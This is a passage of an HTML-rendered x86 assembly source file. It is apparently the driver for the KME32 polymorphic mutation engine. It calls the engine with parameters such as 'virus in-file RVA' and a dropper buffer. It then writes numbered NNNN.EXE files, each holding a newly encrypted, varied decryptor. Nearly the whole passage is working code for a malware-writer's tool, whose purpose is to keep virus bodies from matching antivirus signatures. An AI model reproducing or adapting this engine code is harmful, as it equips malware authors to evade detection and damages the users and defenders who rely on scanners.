                        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
                        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
                        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                        </span><span class="sc6">cld</span><span class="sc0">
                        </span><span class="sc6">repnz</span><span class="sc0">   </span><span class="sc6">scasb</span><span class="sc0">
                        </span><span class="sc6">neg</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
                        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
                        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">fwrite</span><span class="sc0">
                        </span><span class="sc6">popa</span><span class="sc0">
                        </span><span class="sc6">ret</span><span class="sc0">

                        </span><span class="sc1">; subroutine to increase file number (NNNN.EXE)</span><span class="sc0">

</span><span class="sc5">inc_filename</span><span class="sc4">:</span><span class="sc0">           </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">filename_1stdigit</span><span class="sc4">+</span><span class="sc5">filename_ndigit</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">
</span><span class="sc5">inc_1</span><span class="sc4">:</span><span class="sc0">                  </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">
                        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc12">'9'</span><span class="sc0">
                        </span><span class="sc6">jbe</span><span class="sc0">     </span><span class="sc5">inc_2</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc12">'0'</span><span class="sc0">
                        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc0">
                        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">filename_1stdigit</span><span class="sc0">
                        </span><span class="sc6">jb</span><span class="sc0">      </span><span class="sc5">inc_filename</span><span class="sc0">
                        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">inc_1</span><span class="sc0">
</span><span class="sc5">inc_2</span><span class="sc4">:</span><span class="sc0">                  </span><span class="sc6">ret</span><span class="sc0">

                        </span><span class="sc1">; subroutine to write file (NNNN.EXE)</span><span class="sc0">

</span><span class="sc5">write_file</span><span class="sc4">:</span><span class="sc0">             </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">filename</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">fcreate</span><span class="sc0">

                        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">exehdr1</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">exehdr1_size</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">fwrite</span><span class="sc0">

                        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">buf</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">execode_size</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">fwrite</span><span class="sc0">

                        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">exehdr2</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">exehdr2_size</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">fwrite</span><span class="sc0">

                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">fclose</span><span class="sc0">
                        </span><span class="sc6">ret</span><span class="sc0">

                        </span><span class="sc1">; call kme_main &amp; calc new eip</span><span class="sc0">

</span><span class="sc5">call_kme</span><span class="sc4">:</span><span class="sc0">               </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">ntry</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">

</span><span class="sc5">@@retry</span><span class="sc4">:</span><span class="sc0">                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">                     </span><span class="sc1">; flags</span><span class="sc0">
                        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">                     </span><span class="sc1">; cmd mask</span><span class="sc0">
                        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebp</span><span class="sc0">                     </span><span class="sc1">; cmd2 mask</span><span class="sc0">
                        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">                     </span><span class="sc1">; reg mask</span><span class="sc0">
                        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">                     </span><span class="sc1">; jmps if rnd(X)==0</span><span class="sc0">
                        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">buf_entry</span><span class="sc0">        </span><span class="sc1">; [output eip]</span><span class="sc0">
                        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">buf_size</span><span class="sc0">         </span><span class="sc1">; [output size]</span><span class="sc0">
                        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">                     </span><span class="sc1">; output filler</span><span class="sc0">
                        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">execode_size</span><span class="sc0">            </span><span class="sc1">; output/max size</span><span class="sc0">
                        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">buf</span><span class="sc0">              </span><span class="sc1">; output buffer</span><span class="sc0">
                        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">dropper_entry</span><span class="sc4">-</span><span class="sc5">dropper_start</span><span class="sc0"> </span><span class="sc1">; input eip</span><span class="sc0">
                        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">dropper_size</span><span class="sc0">            </span><span class="sc1">; input size</span><span class="sc0">
                        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">dropper_start</span><span class="sc0">    </span><span class="sc1">; input buffer</span><span class="sc0">
                        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">initregs</span><span class="sc0">         </span><span class="sc1">; 0 or pointer to 8 dwords</span><span class="sc0">
                        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">exitregs</span><span class="sc0">         </span><span class="sc1">; 0 or pointer to 8 dwords</span><span class="sc0">
                        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">                       </span><span class="sc1">; virus in-file RVA</span><span class="sc0">
                        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">                       </span><span class="sc1">; original entry RVA</span><span class="sc0">
                        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">REG_ALL</span><span class="sc0">                 </span><span class="sc1">; push/pop regs at prolog/epilog</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">my_random</span><span class="sc0">
                        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">rseed</span><span class="sc0">                   </span><span class="sc1">; randseed</span><span class="sc0">
                        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">v_nlayer</span><span class="sc0">                </span><span class="sc1">; # of layers</span><span class="sc0">
                        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">tempbuf</span><span class="sc0">          </span><span class="sc1">; temp buf ptr</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">kme_main</span><span class="sc0">
                        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc4">*</span><span class="sc5">KME_N_ARGS</span><span class="sc0">

                        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">KME_ERROR_SUCCESS</span><span class="sc0">
                        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">@@success</span><span class="sc0">
                        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">KME_ERROR_NOMEMORY</span><span class="sc0">
                        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">@@exit</span><span class="sc0">
                        </span><span class="sc1">; retry if no memory</span><span class="sc0">

                        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc5">ntry</span><span class="sc0">
                        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">@@retry</span><span class="sc0">
</span><span class="sc5">@@exit</span><span class="sc4">:</span><span class="sc0">
                        </span><span class="sc6">retn</span><span class="sc0">

</span><span class="sc5">@@success</span><span class="sc4">:</span><span class="sc0">              </span><span class="sc6">pusha</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">buf_entry</span><span class="sc0">          </span><span class="sc1">; set new eip</span><span class="sc0">
                        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">execode_rva</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">exehdr1.dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">exeeip_offs</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

                        </span><span class="sc1">; if generated decryptor used less than given space,</span><span class="sc0">
                        </span><span class="sc1">; fill alignment with NOPs</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">execode_size</span><span class="sc0">
                        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">buf_size</span><span class="sc0">
                        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">@@ok</span><span class="sc0">
                        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">buf</span><span class="sc0">
                        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">buf_size</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">90h</span><span class="sc0">
                        </span><span class="sc6">cld</span><span class="sc0">
                        </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">stosb</span><span class="sc0">
</span><span class="sc5">@@ok</span><span class="sc4">:</span><span class="sc0">
                        </span><span class="sc6">popa</span><span class="sc0">

                        </span><span class="sc6">retn</span><span class="sc0">

</span><span class="sc1">; DWORD cdecl my_random(DWORD userparam, DWORD range)</span><span class="sc0">
</span><span class="sc5">my_random</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc1">; [esp+4] = user_param</span><span class="sc0">
    </span><span class="sc1">; [esp+8] = range</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">rseed</span><span class="sc0">
    </span><span class="sc6">imul</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">214013</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2531011</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">rseed</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">shr</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc0">
    </span><span class="sc6">imul</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">shr</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc0">
    </span><span class="sc6">retn</span><span class="sc0">

</span><span class="sc9">include</span><span class="sc0">                 </span><span class="sc5">_fileio.inc</span><span class="sc0">                      </span><span class="sc1">; file io subroutines</span><span class="sc0">

                        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'$KME_START$'</span><span class="sc0">
</span><span class="sc5">kme_start</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc9">include</span><span class="sc0">                 </span><span class="sc5">..</span><span class="sc0">\</span><span class="sc5">SRC</span><span class="sc0">\</span><span class="sc5">kme.asm</span><span class="sc0"> </span><span class="sc1">; KME32 engine</span><span class="sc0">
</span><span class="sc5">kme_end</span><span class="sc4">:</span><span class="sc0">
                        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'$KME_END$'</span><span class="sc0">

</span><span class="sc5">intromsg</span><span class="sc0">                </span><span class="sc9">label</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0">

</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'--- KME engine used '</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">kme_end</span><span class="sc4">-</span><span class="sc5">kme_start</span><span class="sc4">)/</span><span class="sc2">1000</span><span class="sc0"> </span><span class="sc9">mod</span><span class="sc0"> </span><span class="sc2">10</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc12">'0'</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">kme_end</span><span class="sc4">-</span><span class="sc5">kme_start</span><span class="sc4">)/</span><span class="sc0"> </span><span class="sc2">100</span><span class="sc0"> </span><span class="sc9">mod</span><span class="sc0"> </span><span class="sc2">10</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc12">'0'</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">kme_end</span><span class="sc4">-</span><span class="sc5">kme_start</span><span class="sc4">)/</span><span class="sc0">  </span><span class="sc2">10</span><span class="sc0"> </span><span class="sc9">mod</span><span class="sc0"> </span><span class="sc2">10</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc12">'0'</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">kme_end</span><span class="sc4">-</span><span class="sc5">kme_start</span><span class="sc4">)/</span><span class="sc0">   </span><span class="sc2">1</span><span class="sc0"> </span><span class="sc9">mod</span><span class="sc0"> </span><span class="sc2">10</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc12">'0'</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">' bytes ---'</span><span class="sc4">,</span><span class="sc2">13</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

                        </span><span class="sc9">end</span><span class="sc0">     </span><span class="sc5">start</span><span class="sc0">
</span></div></body>
</html>
